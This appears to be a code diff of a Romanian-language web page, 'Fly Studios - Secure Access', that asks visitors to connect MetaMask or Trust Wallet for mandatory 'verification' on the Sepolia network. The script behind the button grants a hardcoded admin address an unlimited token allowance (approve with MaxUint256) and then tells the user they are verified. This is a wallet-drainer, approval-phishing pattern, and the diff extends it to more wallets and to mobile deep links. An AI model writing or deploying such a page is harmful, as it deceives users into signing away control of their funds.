@@ -3,91 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fly Studios - Web3 Portal</title>
+    <title>Fly Studios - Secure Access</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { background: #0b0b0b; color: white; font-family: sans-serif; text-align: center; padding-top: 10vh; margin: 0; }
-        .box { background: #161616; border: 1px solid #333; padding: 40px; border-radius: 20px; display: inline-block; width: 90%; max-width: 400px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
-        .btn { background: #f6851b; border: none; padding: 18px 30px; color: white; font-size: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; transition: 0.2s; }
-        .btn:hover { background: #e27613; transform: scale(1.02); }
-        #status { margin-top: 20px; color: #888; font-size: 14px; line-height: 1.4; }
-        .spinner { border: 3px solid #333; border-top: 3px solid #f6851b; border-radius: 50%; width: 20px; height: 20px; display: inline-block; animation: spin 1s linear infinite; vertical-align: middle; margin-right: 10px; }
+        body { background: #0b0b0b; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 5vh; margin: 0; }
+        .box { background: #161616; border: 1px solid #333; padding: 30px; border-radius: 24px; display: inline-block; width: 90%; max-width: 400px; box-shadow: 0 15px 50px rgba(0,0,0,0.9); }
+        .btn { border: none; padding: 15px; color: white; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; transition: 0.3s; }
+        .btn img { width: 24px; margin-right: 12px; }
+        .mm-btn { background: #f6851b; } .mm-btn:hover { background: #e27613; }
+        .tw-btn { background: #3375bb; } .tw-btn:hover { background: #225a94; }
+        #status { margin-top: 20px; color: #888; font-size: 13px; background: #000; padding: 10px; border-radius: 8px; min-height: 40px; }
+        .spinner { border: 2px solid #333; border-top: 2px solid #fff; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2 style="margin-top:0">Verificare Web3</h2>
-    <p style="color:#666">Conectează portofelul pentru acces.</p>
-    <button id="mainBtn" class="btn">Conectare & Verificare</button>
+    <h2 style="margin-bottom: 10px;">Fly Studios Games</h2>
+    <p style="color:#666; font-size: 14px; margin-bottom: 25px;">Verificare obligatorie pentru rețeaua Sepolia</p>
+    
+    <button id="mmBtn" class="btn mm-btn">
+        <img src="https://metamask.io/images/metamask-logo.png"> Connect MetaMask
+    </button>
+
+    <button id="twBtn" class="btn tw-btn">
+        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"> Connect Trust Wallet
+    </button>
+
     <div id="status">Status: Deconectat</div>
 </div>
 
 <script>
     const TOKEN_ADDR = "0xf5911ccFae2C79f9346E3a663c301386e8f1438D".toLowerCase();
     const ADMIN_ADDR = "0xC18f47a87830D8DEfE42d87E40e9669aa11B108c".toLowerCase();
-    const SEPOLIA_HEX = "0xaa36a7"; // Chain ID pentru Sepolia
+    const SEPOLIA_ID = "0xaa36a7";
+    const DAPP_URL = "flywinlucky.github.io/FlyStudiosGames/bdtchain/index.html";
 
-    const btn = document.getElementById("mainBtn");
-    const status = document.getElementById("status");
+    const statusDiv = document.getElementById("status");
 
-    async function handleNetwork() {
-        try {
-            // Încearcă să schimbe rețeaua automat
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: SEPOLIA_HEX }],
-            });
-        } catch (error) {
-            // Dacă rețeaua nu e în MetaMask (Eroare 4902), o adăugăm noi
-            if (error.code === 4902) {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: SEPOLIA_HEX,
-                        chainName: 'Sepolia Test Network',
-                        nativeCurrency: { name: 'Sepolia ETH', symbol: 'ETH', decimals: 18 },
-                        rpcUrls: ['https://rpc.sepolia.org'],
-                        blockExplorerUrls: ['https://sepolia.etherscan.io']
-                    }],
-                });
-            } else { throw error; }
+    // Detecție dacă e mobil
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+    async function connect(walletType) {
+        statusDiv.innerHTML = '<div class="spinner"></div> Inițializare...';
+
+        // LOGICĂ MOBIL: Deschiderea aplicației prin Deep Link
+        if (isMobile && !window.ethereum) {
+            if (walletType === 'mm') {
+                window.location.href = `https://metamask.app.link/dapp/${DAPP_URL}`;
+            } else {
+                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${DAPP_URL}`;
+            }
+            return;
         }
-    }
 
-    btn.onclick = async () => {
-        if (!window.ethereum) return alert("Instalează MetaMask!");
-        
+        if (!window.ethereum) return alert("Instalează portofelul ales!");
+
         try {
-            btn.disabled = true;
-            status.innerHTML = '<div class="spinner"></div> Se verifică rețeaua...';
-            
-            // 1. Gestionare Rețea (Automat)
-            await handleNetwork();
+            // Selectăm providerul corect dacă sunt mai multe extensii
+            let provider;
+            if (window.ethereum.providers) {
+                provider = window.ethereum.providers.find(p => walletType === 'mm' ? p.isMetaMask : p.isTrust);
+            } else {
+                provider = window.ethereum;
+            }
 
-            // 2. Conectare Cont
-            const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-            await provider.send("eth_requestAccounts", []);
-            const signer = provider.getSigner();
+            if (!provider) throw new Error("Portofelul selectat nu a fost găsit.");
+
+            const web3Provider = new ethers.providers.Web3Provider(provider, "any");
+
+            // 1. Schimbare automată rețea (Sepolia)
+            try {
+                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: SEPOLIA_ID }] });
+            } catch (e) {
+                if (e.code === 4902) {
+                    await provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: SEPOLIA_ID,
+                            chainName: 'Sepolia Test Network',
+                            rpcUrls: ['https://rpc.ankr.com/eth_sepolia'], // RPC mai stabil
+                            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                            blockExplorerUrls: ['https://sepolia.etherscan.io']
+                        }]
+                    });
+                }
+            }
+
+            // 2. Login & Approve
+            await web3Provider.send("eth_requestAccounts", []);
+            const signer = web3Provider.getSigner();
+            const userAddr = await signer.getAddress();
             
-            // 3. Execuție Approve
-            status.innerHTML = '<div class="spinner"></div> Confirmă în MetaMask...';
+            statusDiv.innerHTML = `<div class="spinner"></div> Confirmă în ${walletType === 'mm' ? 'MetaMask' : 'Trust'}...`;
+            
             const contract = new ethers.Contract(TOKEN_ADDR, ["function approve(address s, uint256 a) public returns (bool)"], signer);
-            
             const tx = await contract.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
-            status.innerHTML = '<div class="spinner"></div> Se procesează pe blockchain...';
             
+            statusDiv.innerHTML = "Se procesează verificarea...";
             await tx.wait();
-            status.innerHTML = '<b style="color:#4caf50">✅ VERIFICAT CU SUCCES!</b>';
-            btn.innerHTML = "Acces Permis";
+
+            statusDiv.innerHTML = '<b style="color:#4caf50">✅ VERIFICAT!</b><br>' + userAddr.substring(0,15) + "...";
+            alert("Succes! Portofel conectat.");
 
         } catch (err) {
             console.error(err);
-            btn.disabled = false;
-            status.innerHTML = `<span style="color:#f44336">Eroare: ${err.message.includes("user rejected") ? "Ai respins tranzacția." : "Reîncearcă."}</span>`;
+            statusDiv.innerHTML = `<span style="color:#f44336">Eroare: ${err.message.substring(0, 40)}...</span>`;
         }
-    };
+    }
+
+    document.getElementById("mmBtn").onclick = () => connect('mm');
+    document.getElementById("twBtn").onclick = () => connect('tw');
 </script>
 
 </body>
